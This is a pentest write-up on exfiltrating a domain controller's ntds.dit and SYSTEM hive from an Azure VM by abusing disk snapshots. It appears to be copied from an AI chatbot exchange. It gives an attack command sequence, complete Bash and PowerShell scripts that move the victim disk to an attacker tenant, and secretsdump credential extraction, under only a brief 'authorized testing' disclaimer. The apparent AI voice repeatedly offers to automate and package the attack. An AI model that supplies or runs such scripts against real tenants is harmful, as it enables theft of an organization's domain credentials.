Azure-pentest-vm-backup-snapshot-abuse

# Azure - Shadow Copy / Snapshot Exfiltration Attack

**🎯 Objective**

Exfiltrate sensitive files (e.g., ntds.dit, SYSTEM) from a **target Azure VM** by abusing snapshot permissions. Similar to the AWS technique, this method leverages disk snapshots and volume mounting.

------------------------------------------------------------------------

**🛠️ Prerequisites**

- Access to **Azure credentials** with:

  - Microsoft.Compute/snapshots/write

  - Microsoft.Compute/disks/read

  - Microsoft.Compute/virtualMachines/write

- CLI tools: az, secretsdump.py (Impacket), ssh, sftp

------------------------------------------------------------------------

**📚 Attack Flow**

1.  **Authenticate with Victim Azure Account**

2.  az login --tenant \<victim-tenant\>

3.  **List Target VM and Identify OS Disk**

4.  az vm list --query "\[\].{name:name,resourceGroup:resourceGroup}" -o table

5.  az vm show --name \<vm-name\> --resource-group \<rg\> --query "storageProfile.osDisk.managedDisk.id"

6.  **Create Snapshot of the OS Disk**

7.  az snapshot create \\

8.  --resource-group \<rg\> \\

9.  --source \<disk-id\> \\

10. --name snapshot-victimvm

11. **Grant Attacker Access to Snapshot (via RBAC or export link)**

12. az role assignment create \\

13. --assignee \<attacker-object-id\> \\

14. --role "Reader" \\

15. --scope "/subscriptions/\<sub\>/resourceGroups/\<rg\>/providers/Microsoft.Compute/snapshots/snapshot-victimvm"

16. **Switch to Attacker Account**

17. az login --tenant \<attacker-tenant\>

18. **Create New Disk from Snapshot**

19. az disk create \\

20. --resource-group \<attacker-rg\> \\

21. --name mounted-disk \\

22. --source "/subscriptions/.../snapshot-victimvm"

23. **Create Temporary VM & Attach the Disk**

24. az vm create --name forensics-vm --resource-group \<attacker-rg\> --image UbuntuLTS --generate-ssh-keys

25. az vm disk attach --vm-name forensics-vm --disk mounted-disk --new false

26. **SSH into the New VM and Mount the Disk**

27. ssh azureuser@\<public-ip\>

28. sudo mkdir /mnt/victim

29. sudo mount /dev/sdc1 /mnt/victim

30. **Copy Target Files (e.g., from Windows domain controller)**

31. sudo cp /mnt/victim/Windows/NTDS/ntds.dit ~/

32. sudo cp /mnt/victim/Windows/System32/config/SYSTEM ~/

33. sudo chown azureuser:azureuser ~/ntds.dit ~/SYSTEM

34. **SFTP the Files Back to Local**

sftp azureuser@\<public-ip\>

get ntds.dit

get SYSTEM

11. **Run SecretsDump Locally**

secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL -outputfile secrets

------------------------------------------------------------------------

**⚠️ Notes**

- Works best on **domain controllers** where the goal is credential extraction.

- Highly dependent on snapshot export/mount permissions.

- Similar attack path as AWS CreateSnapshot + modify-snapshot-attribute.

------------------------------------------------------------------------

Would you like this turned into a modular Bash or PowerShell script for repeatable Azure post-exploitation?

Great — here's a **modular Bash script** to automate the **Azure Shadow Copy Attack** for post-exploitation scenarios:

⚠️ **For educational or authorized testing purposes only**

------------------------------------------------------------------------

**azure_shadow_copy.sh**

\#!/bin/bash

\# Azure Shadow Copy Attack Script

\# Requires: Azure CLI (\`az\`), SSH, SFTP, secretsdump (Impacket)

\# Tested on Linux environments

\# === CONFIGURATION ===

RESOURCE_GROUP="\<victim_resource_group\>"

VM_NAME="\<target_vm_name\>"

ATTACKER_RG="\<attacker_resource_group\>"

ATTACKER_VM_NAME="forensics-vm"

SNAPSHOT_NAME="snapshot-\${VM_NAME}"

DISK_NAME="cloned-disk-\${VM_NAME}"

echo "\[+\] Step 1: Get OS Disk ID of target VM..."

DISK_ID=\$(az vm show --name "\$VM_NAME" --resource-group "\$RESOURCE_GROUP" \\

--query "storageProfile.osDisk.managedDisk.id" -o tsv)

echo "\[+\] Step 2: Create Snapshot..."

az snapshot create --resource-group "\$RESOURCE_GROUP" \\

--source "\$DISK_ID" --name "\$SNAPSHOT_NAME"

echo "\[+\] Step 3: Grant Reader role to current user (if needed)"

ATTACKER_ID=\$(az ad signed-in-user show --query id -o tsv)

SNAPSHOT_SCOPE=\$(az snapshot show --name "\$SNAPSHOT_NAME" --resource-group "\$RESOURCE_GROUP" --query id -o tsv)

az role assignment create --assignee "\$ATTACKER_ID" --role "Reader" --scope "\$SNAPSHOT_SCOPE"

echo "\[+\] Step 4: Create managed disk from snapshot in attacker RG..."

az disk create --name "\$DISK_NAME" --resource-group "\$ATTACKER_RG" \\

--source "\$SNAPSHOT_SCOPE"

echo "\[+\] Step 5: Create temporary Linux VM (if not already exists)..."

az vm create --name "\$ATTACKER_VM_NAME" --resource-group "\$ATTACKER_RG" \\

--image UbuntuLTS --generate-ssh-keys --query publicIpAddress -o tsv

echo "\[+\] Step 6: Attach disk to attacker VM..."

az vm disk attach --vm-name "\$ATTACKER_VM_NAME" \\

--resource-group "\$ATTACKER_RG" --disk "\$DISK_NAME"

echo "\[\*\] DONE - SSH into the forensics VM and extract NTDS/SYSTEM:"

echo " ssh azureuser@\<public-ip\>"

echo " sudo mkdir /mnt/victim"

echo " sudo mount /dev/sdc1 /mnt/victim"

echo " sudo cp /mnt/victim/Windows/NTDS/ntds.dit ~/"

echo " sudo cp /mnt/victim/Windows/System32/config/SYSTEM ~/"

echo " sudo chown azureuser:azureuser ~/ntds.dit ~/SYSTEM"

echo "\[\*\] Then use SFTP to pull files and run:"

echo " secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL -outputfile secrets.txt"

------------------------------------------------------------------------

**Instructions**

1.  **Customize**: Set RESOURCE_GROUP, VM_NAME, and ATTACKER_RG

2.  **Run**:

3.  chmod +x azure_shadow_copy.sh

4.  ./azure_shadow_copy.sh

5.  **Follow the printed instructions** to extract files from the mounted disk.

------------------------------------------------------------------------

Would you like a PowerShell version for Windows-based environments too?

## Windows based PowerShell version

Here is a **PowerShell version** of the Azure Shadow Copy (Snapshot Exfiltration) attack script for Windows-based red team operations or Azure pentests:

⚠️ **For educational use in authorized environments only**

------------------------------------------------------------------------

**Azure-ShadowCopy.ps1**

\<#

.SYNOPSIS

Azure Shadow Copy Snapshot Attack - PowerShell Edition

.DESCRIPTION

Creates a snapshot of a victim VM’s OS disk and mounts it to an attacker VM for file extraction.

Use this to access sensitive files (e.g., NTDS.dit, SYSTEM hive) during Azure post-exploitation.

.REQUIREMENTS

\- Azure PowerShell Module (Az)

\- Logged into Azure via \`Connect-AzAccount\`

\- Attacker has necessary disk/snapshot/vm permissions

\#\>

\# === USER CONFIGURATION ===

\$VictimRG = "VictimResourceGroup"

\$VictimVM = "TargetVM"

\$AttackerRG = "AttackerResourceGroup"

\$AttackerVM = "ForensicsVM"

\$SnapshotName = "snap-\$VictimVM"

\$DiskName = "disk-from-\$VictimVM"

\# === STEP 1: Get victim disk ID ===

Write-Host "\[+\] Getting OS disk ID for victim VM..." -ForegroundColor Cyan

\$diskId = (Get-AzVM -ResourceGroupName \$VictimRG -Name \$VictimVM).StorageProfile.OsDisk.ManagedDisk.Id

\# === STEP 2: Create snapshot ===

Write-Host "\[+\] Creating snapshot..." -ForegroundColor Cyan

\$snapshotConfig = New-AzSnapshotConfig -SourceUri \$diskId -Location "eastus" -CreateOption Copy

New-AzSnapshot -Snapshot \$snapshotConfig -SnapshotName \$SnapshotName -ResourceGroupName \$VictimRG

\# === STEP 3: Create disk from snapshot ===

Write-Host "\[+\] Creating new managed disk from snapshot in attacker RG..." -ForegroundColor Cyan

\$snap = Get-AzSnapshot -ResourceGroupName \$VictimRG -SnapshotName \$SnapshotName

\$diskConfig = New-AzDiskConfig -AccountType StandardSSD_LRS -Location \$snap.Location \`

-CreateOption Copy -SourceResourceId \$snap.Id

New-AzDisk -DiskName \$DiskName -Disk \$diskConfig -ResourceGroupName \$AttackerRG

\# === STEP 4: Attach disk to attacker's forensics VM ===

Write-Host "\[+\] Attaching disk to attacker VM..." -ForegroundColor Cyan

\$vm = Get-AzVM -Name \$AttackerVM -ResourceGroupName \$AttackerRG

Add-AzVMDataDisk -VM \$vm -Name \$DiskName -CreateOption Attach -ManagedDiskId \`

(Get-AzDisk -ResourceGroupName \$AttackerRG -DiskName \$DiskName).Id -Lun 1

Update-AzVM -ResourceGroupName \$AttackerRG -VM \$vm

\# === DONE ===

Write-Host "\[\*\] DONE. SSH into the forensics VM, mount, and extract NTDS/SYSTEM files." -ForegroundColor Green

Write-Host "Example:"

Write-Host " sudo mkdir /mnt/victim"

Write-Host " sudo mount /dev/sdc1 /mnt/victim"

Write-Host " sudo cp /mnt/victim/Windows/NTDS/ntds.dit ~/"

Write-Host " sudo cp /mnt/victim/Windows/System32/config/SYSTEM ~/"

Write-Host " sudo chown azureuser:azureuser ~/ntds.dit ~/SYSTEM"

Write-Host ""

Write-Host "Then SFTP and run secretsdump.py locally."

------------------------------------------------------------------------

**🧪 To Run:**

1.  **Install Azure PowerShell** (if not already installed):

2.  Install-Module -Name Az -Scope CurrentUser -Repository PSGallery -Force

3.  **Authenticate**:

4.  Connect-AzAccount

5.  **Execute** the script in a PowerShell session:

6.  .\Azure-ShadowCopy.ps1

------------------------------------------------------------------------

Would you like both scripts bundled into a ZIP file or uploaded to a private GitHub repo for easier access?
